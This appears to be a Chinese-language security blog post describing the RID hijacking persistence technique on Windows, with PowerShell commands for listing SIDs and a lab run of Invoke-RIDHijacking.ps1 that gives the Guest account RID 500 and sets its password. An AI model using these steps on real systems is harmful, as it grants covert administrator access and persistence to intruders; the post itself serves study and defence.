---
title: RID Hijacking
date: 2020-12-31 23:59:53 +0800
categories: [域安全, TA0003持久化]
tags: [RIDHijacking, TA0003持久化]     # TAG names should always be lowercase
typora-root-url: ..
---



# RID Hijacking

## 0x00 简介

通过操作SAM注册表，修改本地账户RID为500，实现RID劫持



**参考：**

[Persistence – RID Hijacking](https://pentestlab.blog/2020/02/12/persistence-rid-hijacking/)

[Rid Hijacking: When Guests Become Admins](https://blog.stealthbits.com/rid-hijacking-when-guests-become-admins/)



## 0x01 相关概念

使用psexec.exe以system权限打开注册表*HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users*，

![img](/assets/img/1963614-20200402113951327-1904547625.png)

![img](/assets/img/1963614-20200405193338454-466131382.png)

 

 **Powershell获取部分SID：**

```
# 获取本地账户SID
PS C:\Users\win10> Get-LocalUser | Format-Table Name, SID

Name               SID
----               ---
Administrator      S-1-5-21-2464835639-589224845-1263889796-500
DefaultAccount     S-1-5-21-2464835639-589224845-1263889796-503
DELL               S-1-5-21-2464835639-589224845-1263889796-1000
Guest              S-1-5-21-2464835639-589224845-1263889796-501
WDAGUtilityAccount S-1-5-21-2464835639-589224845-1263889796-504

# 获取本地账户安全组SID
PS C:\Users\win10> Get-LocalGroup | Format-Table Name, SID

# 获取域账户SID
PS C:\Users\Administrator> Get-ADUser -Filter * | Format-Table Name, SID

Name           SID
----           ---
Administrator  S-1-5-21-411020405-2313891870-2612819012-500
Guest          S-1-5-21-411020405-2313891870-2612819012-501
DefaultAccount S-1-5-21-411020405-2313891870-2612819012-503
krbtgt         S-1-5-21-411020405-2313891870-2612819012-502
win10          S-1-5-21-411020405-2313891870-2612819012-1107
win7           S-1-5-21-411020405-2313891870-2612819012-1109

# 获取域账户安全组
PS C:\Users\Administrator> Get-ADGroup  -Filter * | Format-Table Name, SID
```

一般RID 500是Administrator, 501是Guest, 503是DefalutAccount

此外，Windows会预定义一些account和group，如*NT AUTHORITY\Local Service S-1-5-19*，在这里可以查看常见SID：

https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems

https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers#well-known-sids

##  

## 0x02 RID Hijacking

RID劫持就是修改注册表，将Guest等非administrator账户所对应的RID改成500，冒充Administrator； 此外，如果账户是禁用的，还需要修改偏移`0x38`处的值来启用账户。

### 1. Invoke-RIDHijacking.ps1

```
PS C:\Windows\system32> net user guest /active:yes
The command completed successfully.

PS C:\Windows\system32> Import-Module C:\Users\win10\Desktop\Invoke-RIDHijacking.ps1
PS C:\Windows\system32> Invoke-RIDHijacking -UseGuest -RID 500 -Password Password123
[+] Elevated to SYSTEM privileges
[+] Found Guest account
[+] Target account username: Guest
[+] Target account RID: 501
[*] Current RID value in F for Guest: 01f4
[*] Setting RID 500 (01f4) in F for Guest
[*] Setting password to user...
The command completed successfully.

[+] Password set to Password123
[+] SUCCESS: The RID 500 has been set to the account Guest with original RID 501
```

在win10上执行此操作会导致该账户配置文件损坏，桌面登录时explorer.exe不断崩溃重启，只能runas或网络登录。

```
PS C:\Windows\system32> runas /user:guest powershell.exe
Enter the password for guest:
Attempting to start powershell.exe as user "WIN10-PC\guest" ...
```

通过whoami命令查看Guest现在对应的SID，但并没有显示Guest账户加入Administrators group中；此外，用powershell Get-LocalUsers命令并没有得到更新后的RID，与用whoami看到的不一致。 

 ![img](/assets/img/1963614-20200405192356137-736697671.png) 











 

 